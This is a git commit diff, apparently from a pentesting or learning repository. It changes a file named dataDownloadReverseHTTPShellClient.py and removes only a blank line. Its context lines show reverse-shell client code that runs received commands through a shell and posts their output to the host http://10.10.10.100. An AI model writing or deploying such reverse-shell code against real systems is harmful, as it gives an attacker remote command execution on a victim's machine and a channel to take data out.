546cab08f4fb8489d3e83e5c55676888917436e9
Samuel Riddle <30331129+sjriddle@users.noreply.github.com>
2018-11-05 12:19:26 -0700

    Update dataDownloadReverseHTTPShellClient.py

--- dataDownloadReverseHTTPShellClient.py
+++ dataDownloadReverseHTTPShellClient.py
@@ -20,5 +20,4 @@ while True:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read())
         post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read())
-
 time.sleep(3)
